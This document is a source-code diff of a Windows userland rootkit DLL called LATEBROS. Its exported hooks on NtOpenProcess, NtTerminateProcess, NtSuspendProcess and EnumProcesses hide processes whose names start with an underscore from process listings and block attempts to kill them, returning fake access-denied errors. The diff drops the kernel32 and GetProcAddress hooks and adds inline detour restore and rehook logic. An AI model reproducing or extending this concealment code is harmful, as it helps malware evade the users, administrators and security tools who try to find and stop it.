@@ -1,33 +1,6 @@
 ﻿#include "stdafx.h"
+#include "detour.hpp"
 
-/*
-* Function: KERNEL32!TerminateProcess
-* Purpose: Protect any LATEBROS process from conventional termination
-*
-*/
-extern "C" NTSTATUS __declspec(dllexport) WINAPI kterm(HANDLE process_handle, UINT exit_code)
-{
-	// SOME APPLICATIONS (TASKMGR FOR EXAMPLE) OPEN SPECIFIC HANDLES WITH JUST THE REQUIRED RIGHTS
-	// TO TERMINATE A PROCESS, BUT NOT ENOUGH TO QUERY A MODULE NAME
-	// SO WE HAVE TO OPEN A TEMPORARY HANDLE WITH PROPER RIGHTS
-	auto process_id = GetProcessId(process_handle);
-	auto temp_handle = OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, false, process_id);
-
-	wchar_t name_buffer[MAX_PATH] = {};
-	auto success = GetModuleBaseNameW(temp_handle, nullptr, name_buffer, MAX_PATH);
-
-	// CLOSE HANDLE REGARDLESS OF OUTCOME TO PREVENT LEAKS
-	CloseHandle(temp_handle);
-
-	// 'INFECTED' PROCESS IS TRYING TO OPEN A HANDLE TO A LATEBROS PROCESS
-	if (success && name_buffer[0] == L'_')
-	{
-		SetLastError(ERROR_ACCESS_DENIED);	// TRICK APPLICATIONS INTO THINKING THEY DON'T HAVE ACCESS
-		return NULL;						// RETURN ERROR
-	}
-
-	return TerminateProcess(process_handle, exit_code);
-}
 /*
 * Function: ntdll!NtTerminateProcess
 * Purpose: Protect any LATEBROS process from a rather unconventional way of termination
@@ -59,7 +32,6 @@ extern "C" NTSTATUS __declspec(dllexport) NTAPI ntterm(HANDLE process_handle, NT
 	auto function_pointer = GetProcAddress(GetModuleHandleA("ntdll"), "NtTerminateProcess");
 	return reinterpret_cast<NtTerminateProcesss_t>(function_pointer)(process_handle, exit_code);
 }
-
 
 /*
 * Function: ntdll!NtSuspendProcess
@@ -93,41 +65,25 @@ extern "C" NTSTATUS __declspec(dllexport) NTAPI ntsusp(HANDLE process_handle)
 	return reinterpret_cast<NtSuspendProcesss_t>(function_pointer)(process_handle);
 }
 
-
-/*
- * Function: KERNEL32!OpenProcess
- * Purpose: Disguise and protect any LATEBROS process by preventing client-id/process-id bruteforcing
- *
- */
-extern "C" HANDLE __declspec(dllexport) WINAPI op(DWORD desired_access, BOOL inherit_handle, DWORD process_id)
-{
-	auto handle = OpenProcess(desired_access, inherit_handle, process_id);
-
-	wchar_t name_buffer[MAX_PATH] = {};
-	if (GetModuleBaseNameW(handle, nullptr, name_buffer, MAX_PATH))
-	{
-		// 'INFECTED' PROCESS IS TRYING TO OPEN A HANDLE TO A LATEBROS PROCESS
-		if (name_buffer[0] == L'_')
-		{
-			CloseHandle(handle); // CLOSE HANDLE TO ENSURE IT WON'T BE USED REGARDLESS OF SANITY CHECKS, WHO KNOWS, SHIT DEVELOPERS EXIST
-			return NULL;		 // RETURN ERROR
-		}
-	}
-
-	return handle;
-}
-
 /*
  * Function: ntdll!NtOpenProcess
  * Purpose: Disguise and protect any LATEBROS process by preventing client-id/process-id bruteforcing
  *
  */
 typedef NTSTATUS(NTAPI *NtOpenProcess_t)(PHANDLE ProcessHandle, ACCESS_MASK DesiredAccess, POBJECT_ATTRIBUTES ObjectAttributes, _CLIENT_ID* ClientId);
+extern "C" char __declspec(dllexport) ntop_og[0xE] = {}; // ORIGINAL BYTES
 extern "C" NTSTATUS __declspec(dllexport) NTAPI ntop(PHANDLE out_handle, ACCESS_MASK desired_access, POBJECT_ATTRIBUTES object_attributes, _CLIENT_ID* client_id)
 {
-	auto function_pointer = GetProcAddress(GetModuleHandleA("ntdll"), "NtOpenProcess");
+	auto function_pointer = reinterpret_cast<uintptr_t>(GetProcAddress(GetModuleHandleA("ntdll"), "NtOpenProcess"));
+
+	// RESTORE
+	detour::remove_detour(function_pointer, ntop_og, sizeof(ntop_og));
+
+	// CALL
 	reinterpret_cast<NtOpenProcess_t>(function_pointer)(out_handle, MAXIMUM_ALLOWED, object_attributes, client_id);
 
+	// REHOOK
+	detour::hook_function(function_pointer, reinterpret_cast<uintptr_t>(ntop));
 
 	wchar_t name_buffer[MAX_PATH] = {};
 	if (GetModuleBaseNameW(*out_handle, nullptr, name_buffer, MAX_PATH))
@@ -208,7 +164,6 @@ extern "C" BOOL __declspec(dllexport) WINAPI enump(DWORD* process_ids, DWORD cb,
 	if (!K32EnumProcesses(process_ids, cb, bytes_returned_ptr))
 		return false; // NO NEED TO DO ANYTHING IF THE FUNCTION FAILS
 
-	
     // PARSE ORIGINAL LIST
 	auto process_list = std::unordered_set<DWORD>();
 	for (size_t process_index = 0; process_index < *bytes_returned_ptr / sizeof(DWORD)/*ENTRY SIZE*/; process_index++)
@@ -242,34 +197,4 @@ extern "C" BOOL __declspec(dllexport) WINAPI enump(DWORD* process_ids, DWORD cb,
 	memcpy(process_ids, temp_vector.data(), temp_vector.size() * sizeof(DWORD));
 
 	return true;
-}
-
-/*
- * Function: KERNEL32!GetProcAddress
- * Purpose: Redirect dynamic imports to function hooks
- *
- */
-//using hook_container = std::unordered_map<std::pair<std::string, std::string>, void*>;
-using hook_container = std::vector<std::tuple<std::string, std::string, void*>>;
-extern "C" FARPROC  __declspec(dllexport) WINAPI gpa(HMODULE module, LPCSTR procedure_name)
-{
-	char module_name[50] = {};
-	GetModuleBaseNameA(GetCurrentProcess(), module, module_name, sizeof(module_name));
-
-	hook_container db =
-	{
-		{ "kernel32.dll", "OpenProcess", op },
-		{ "kernel32.dll", "TerminateProcess", kterm },
-		{ "kernel32.dll", "GetProcAddress", gpa },
-		{ "ntdll.dll", "NtOpenProcess", ntop },
-		{ "ntdll.dll", "NtTerminateProcess", ntterm }
-	};
-
-	for (const auto [hook_module_name, hook_function_name, hook_pointer] : db)
-	{
-		if (hook_module_name == module_name && hook_function_name == procedure_name)
-			return reinterpret_cast<FARPROC>(hook_pointer);
-	}
-
-	return GetProcAddress(module, procedure_name);
 }
